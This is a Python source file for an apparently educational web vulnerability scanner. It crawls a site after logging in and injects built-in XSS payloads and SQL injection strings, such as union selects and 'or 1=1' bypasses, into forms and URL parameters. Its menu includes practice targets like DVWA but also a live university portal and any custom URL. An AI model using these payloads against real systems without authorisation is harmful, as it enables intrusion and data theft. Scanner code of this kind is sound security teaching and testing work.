import re
import urllib.parse as urlparse
from bs4 import BeautifulSoup
import requests

#This is the VulnScanner tool class
class VulnScanner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.links_to_ignore = ignore_links
        self.xss_tested=[]
        self.sqli_tested=[]
        self.xss_found=[]
        self.sqli_found=[]

    #This method is used to extract links from a given url
    #Arguments required--> a website URL
    def extract_links(self, url):
        return re.findall('(?:href=")(.*?)"', self.session.get(url).content.decode(errors="ignore"))

    #This method is used to crawl from a given url and ignore few URLs if required
    #Arguments required--> a target website URL
    def crawl_URL(self, url=None):
        if url is None:
            url = self.target_url

        for link in self.extract_links(url):
            link = urlparse.urljoin(url, link)
            if "#" in link:
                link = link.split("#")[0]

            target_urls=self.target_url in link
            not_target_links=link not in self.target_links
            not_ignore_links=link not in self.links_to_ignore
            if target_urls and not_target_links and not_ignore_links:
                self.target_links.append(link)
                print(link)
                self.crawl_URL(link)

    #This method is used to extract HTML forms from a given url
    #Arguments required--> a website URL
    def extract_forms(self, url):
        response = self.session.get(url)
        html_code = response.content
        parsed_html = BeautifulSoup(html_code, "html.parser")
        return parsed_html.findAll("form")

    #This method is used to submit HTML forms to the updated url to find  XSS vulnerabilities
    #Arguments required--> 
    #1--> The HTML form
    #2--> The script/payload used to find the vulnerability
    #3--> The target URL
    def submit_xss_form(self, form, value, url):
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")
            if input_type == "text":
                input_value = value
            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(urlparse.urljoin(url, form.get("action")), data=post_data)
        return self.session.get(urlparse.urljoin(url, form.get("action")), params=post_data)


    #This method is used to submit HTML forms to the updated url to find  SQLi vulnerabilities
    #Arguments required--> 
    #1--> The HTML form
    #2--> The script/payload used to find the vulnerability
    #3--> The target URL
    def submit_sql_form(self, form, value, url):
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")
            if input_type == "text":
                input_value = value
            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(urlparse.urljoin(url, form.get("action")), data=post_data)
        return self.session.get(urlparse.urljoin(url, form.get("action")), params=post_data)

    #This method is used to scan URLs find XSS and SQLi vulnerabilities
    def scan_urls(self):
        xss_scripts = ["<script\x20type='text/javascript'>javascript:alert(1);</script>",
                   
"<sCript\x3Etype='text/javascript'>javascript:alert(1);</scrIpt>",
                   "<script\x0Dtype='text/javascript'>javascript:alert(1);</script>",
                   '<sCript\x09type="text/javascript">javascript:alert(1);</scriPt>',
                   '<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
                   '<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
                   '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
                   '< image / src / onerror = prompt(8) >',
                   '< img / src / onerror = prompt(8) >',
                   '< image src / onerror = prompt(8) >',
                   '< img src / onerror = prompt(8) >',
                   '< image src = q onerror = prompt(8) >',
                   '< img src = q onerror = prompt(8) >']

        sql_scripts = ["%' or 0=0 union select null, version() #",
                       "%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#",
                       'admin" or 1=1#', 
                       'admin" or 1=1/*', 
                       'admin") or ("1"="1', 
                       'admin") or ("1"="1"--', 
                       'admin") or ("1"="1"#', 
                       'admin") or ("1"="1"/*',
                        'admin") or "1"="1', 
                       'admin") or "1"="1"--', 
                       'admin") or "1"="1"#',
                       'admin") or "1"="1"/*']

        for link in self.target_links:
            for form in self.extract_forms(link):
                for script in xss_scripts:
                    print("--> Testing form in " + link)
                    self.xss_tested.append(link)
                    if self.test_xss_in_form(form, link, script):
                        self.xss_found.append(link)
                        print("\n\n***** XSS vulnerability discovered in " 
                              + link + " in the following form *****")
                        print("\n Script used --> " + script)
                        print(form)
                        print("\n\n")

                    if "=" in link:
                        print("\n\n--> Testing " + link)
                        if self.test_xss_in_link(link, script):
                            print("***** Discovered XSS in " + link+ '*****')
                            print("\n Script used --> " + script)
                            print(form)
                            print("\n\n")

        for link in self.target_links:
            for form in self.extract_forms(link):
                for script in sql_scripts:
                    self.sqli_tested.append(link)
                    print("--> Testing form in " + link)
                    if self.test_sql_in_form(form, link, script):
                        self.sqli_found.append(link)
                        print("\n\n***** SQL Injection "+
                              "vulnerability discovered in " 
                              + link + " in the following form *****")
                        print("\n Script used --> " + script)
                        print(form)
                        print("\n\n")

                    if "=" in link:
                        print("\n\n--> Testing " + link)
                        if self.test_sql_in_link(link, script):
                            print("***** Discovered SQL Injection in " + link+' *****')
                            print("\n Script used --> " + script)
                            print(form)
                            print("\n\n")

    #This method is used to check if the script we used to find a vulnerability is in the response of the website
    #This method is only used to find XSS vulnerabilities using the website Link
    #Arguments required--> 
    #1--> The target URL
    #2--> The script/payload used to find the vulnerability
    def test_xss_in_link(self, url, script):
        return script in self.session.get(url.replace("=", "=" + script)).content.decode()

    #This method is used to check if the script we used to find a vulnerability is in the response of the website
    #This method is only used to find XSS vulnerabilities using the HTML form
    #Arguments required--> 
    #1--> The target URL
    #2--> The script/payload used to find the vulnerability
    def test_xss_in_form(self, form, url, script):
        return script in self.submit_xss_form(form, script, url).content.decode()

    #This method is used to check if the script we used to find a vulnerability is in the response of the website
    #This method is only used to find SQLi vulnerabilities using the website Link
    #Arguments required--> 
    #1--> The target URL
    #2--> The script/payload used to find the vulnerability
    def test_sql_in_link(self, url, script):
        return script in self.session.get(url.replace("=", "=" + script)).content.decode()
        
    #This method is used to check if the script we used to find a vulnerability is in the response of the website
    #This method is only used to find SQLi vulnerabilities using the HTML form
    #Arguments required--> 
    #1--> The target URL
    #2--> The script/payload used to find the vulnerability
    def test_sql_in_form(self, form, url, script):
        return script in self.submit_sql_form(form, script, url).content.decode()

#This method is used to crawl and then scan a target URL
#Arguments required--> 
#1--> The VulnScanner class object to make sure we use only a single instance of the class
#2--> The target URL
#3--> The login URL of the target Website
#4--> The links to ignore like the logout URL of the target website
#5--> The data dictionary which has the login credentials
def craw_and_scan(VulnScanner1,target_url,login_url,ignore_links,data_dict):
  VulnScanner1.session.post(login_url, data=data_dict)
  VulnScanner1.crawl_URL()
  VulnScanner1.scan_urls()
  mylist = list(set(VulnScanner1.xss_tested))
  print('Total number of URLs scanned for XSS\n'+'count = ', len(mylist))
  mylist1 = list(set(VulnScanner1.xss_found))
  print('XSS Vulnerabilities found in\n'+'count = ', len(mylist1))
  mylist2 = list(set(VulnScanner1.sqli_tested))
  print('Total number of URLs scanned for SQLi\n'+'count = ', len(mylist2))
  mylist3 = list(set(VulnScanner1.sqli_found))
  print('SQLi Vulnerabilities found in\n'+'count = ', len(mylist3))


#This method is the main method of the tool
### Please make changes in this below method/function to run your custom URL if required ###
def run_scanner():

  while(1):
    print("\n\n1. My UCF")
    print(("2. Vulnweb"))
    print(("3. DVWA"))
    print(("4. Custom URL"))
    user_input=-1
    user_input = int(input("Enter your choice--> "))

    if user_input==1:
      while(1):
        try:
          mfa= str(input('\nIs your account secured with MultiFactor Authentication (DUO Authentication)? (Y/N)-->\n'))

          if(mfa == 'y' or mfa =='Y'):
            print('\n MFA is enabled, Please select another option.')
            break

          elif(mfa == 'n' or mfa == 'N'):
            target_url = 'https://my.ucf.edu/'

            ignore_links = ['https://my.ucf.edu/psc/IHPROD/EMPLOYEE/EMPL/s/WEBLIB_FXLOGOUT.ISCRIPT1.FieldFormula.IScript_FXLogout','https://my.ucf.edu/?shib_logout=done']

            login_url = str(input("\n\nEnter the login link of the target URL \nEg - http://testphp.vulnweb.com/login.php\n"))

            username = str(input("\n\nEnter the username for login page\nEg - admin\n"))

            password = str(input("\n\nEnter the password for login page\nEg - password\n"))

            data_dict = {"username": username, "password": password, "Login": "submit"}

            VulnScanner1 = VulnScanner(target_url, ignore_links)
            craw_and_scan(VulnScanner1,target_url, login_url, ignore_links, data_dict)
            

            break
          else:
            print('\nOut of Bounds, Please enter (Y/N)') 
        except:
          print('\nSome Error Occured! Try again, Please enter (Y/N)')     
      break

    elif user_input == 2:
        target_url = "http://testphp.vulnweb.com"

        ignore_links = ["http://testphp.vulnweb.com/logout.php"]

        data_dict = {"username": "admin", "password": "password", "Login": "submit"}

        login_url = "http://testphp.vulnweb.com/login.php"

        VulnScanner1 = VulnScanner(target_url, ignore_links)
        craw_and_scan(VulnScanner1,target_url, login_url, ignore_links, data_dict)
        break

    elif user_input == 3:
        url = str(input("\n\nEnter IP Address of DVWA--> "))

        target_url = "http://"+url+"/dvwa/"

        ignore_links = ["http://"+url+"/dvwa/logout.php"]

        try:
            password = str(input("\n\nEnter the password for login page\nPassword is either 'password' or press enter to continue...\n"))
            data_dict = {"username": "admin", "password": password, "Login": "submit"}
        except:
            data_dict = {"username": "admin", "password": "", "Login": "submit"}


        login_url = "http://"+url+"/dvwa/login.php"
        security_url = "http://"+url+"/dvwa/security.php"

        VulnScanner1 = VulnScanner(target_url, ignore_links)
        VulnScanner1.session.post(login_url, data=data_dict)
        security_level = {"security": "low", "seclev_submit": "Submit"}
        VulnScanner1.session.post(security_url, data=security_level)
        VulnScanner1.crawl_URL()
        VulnScanner1.scan_urls()
        mylist = list(set(VulnScanner1.xss_tested))
        print('Total number of URLs scanned for XSS\n'+'count = ', len(mylist))
        mylist1 = list(set(VulnScanner1.xss_found))
        print('XSS Vulnerabilities found in\n'+'count = ', len(mylist1))
        mylist2 = list(set(VulnScanner1.sqli_tested))
        print('Total number of URLs scanned for SQLi\n'+'count = ', len(mylist2))
        mylist3 = list(set(VulnScanner1.sqli_found))
        print('SQLi Vulnerabilities found in\n'+'count = ', len(mylist3))

        break
        
    elif user_input==4:
        print("\nFor a custom URL you need to give the following inputs")

        target_url = str(input("\n\nEnter the target URL \nEg - http://testphp.vulnweb.com\n"))

        ignore_links = str(input("\n\nEnter the logout link of the target URL \nEg - http://testphp.vulnweb.com/logout.php\n"))

        login_url = str(input("\n\nEnter the login link of the target URL \nEg - http://testphp.vulnweb.com/login.php\n"))

        username = str(input("\n\nEnter the username for login page\nEg - admin\n"))

        try:
            password = str(input("\n\nEnter the password for login page\nEg - password\n"))
            data_dict = {"username": username, "password": password, "Login": "submit"}
        except:
            data_dict = {"username": username, "password": "", "Login": "submit"}

        VulnScanner1 = VulnScanner(target_url, ignore_links)
        craw_and_scan(VulnScanner1,target_url, login_url, ignore_links, data_dict)
        break

    else:
        print("Entry out of bounds")

run_scanner()
